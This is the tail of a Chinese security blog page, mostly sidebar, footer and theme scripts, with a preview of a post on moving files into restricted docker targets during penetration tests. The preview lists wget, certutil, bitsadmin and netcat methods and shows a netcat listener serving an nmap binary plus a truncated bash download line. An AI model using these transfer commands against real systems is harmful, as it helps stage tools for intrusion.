class="info-item-1">下一篇</div><div class="info-item-2">恶劣环境下（docker）文件传输</div></div><div class="info-2"><div class="info-item-1">  常见的方法 使用shell编写简单的下载函数进行下载（在入口机开启web服务） 使用 wget 进行文件传输 使用 curl 进行文件传输 使用 certutil 进行文件传输 使用 bitsadmin 进行文件传输 使用 PowerShell 进行文件传输 使用 SMB 服务器进行文件传输 使用 SCP 进行文件传输 使用 TFTP 进行文件传输 使用 FTP 传输文件 设置文件传输服务器的不同方法  使用 Netcat 进行文件传输在目标靶机上没有nc命令的情况下使用nc传文件操作 12345678910111213在目标靶机上没有nc命令的情况下使用nc传文件操作本地kali操作1.准备好要复制的静态二进制文件nmap2.准备好/etc/services文件3.本地nc监听端口并带入标准输入重定向指定要传输的文件nc -lvnp 5555 &lt; nmapnc -lvnp 5555 &lt; services目标靶机操作执行之前可以通过md5sum比对传输前后的md5值确认文件传输过程未损坏1.bash -c &quot;cat &lt;...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7c1aee27.html" title="恶劣环境下（docker）文件传输">恶劣环境下（docker）文件传输</a><time datetime="2025-08-07T13:22:49.000Z" title="发表于 2025-08-07 21:22:49">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/58cd1a0.html" title="州弟学安全靶场">州弟学安全靶场</a><time datetime="2025-08-07T13:21:43.000Z" title="发表于 2025-08-07 21:21:43">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/a36a147c.html" title="从小程序到web的一次测试">从小程序到web的一次测试</a><time datetime="2025-08-07T13:21:19.000Z" title="发表于 2025-08-07 21:21:19">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7aba0c03.html" title="内网信息收集">内网信息收集</a><time datetime="2025-08-07T10:03:02.000Z" title="发表于 2025-08-07 18:03:02">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7f69f64e.html" title="SQL注入绕waf总结">SQL注入绕waf总结</a><time datetime="2025-08-07T10:02:25.000Z" title="发表于 2025-08-07 18:02:25">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>
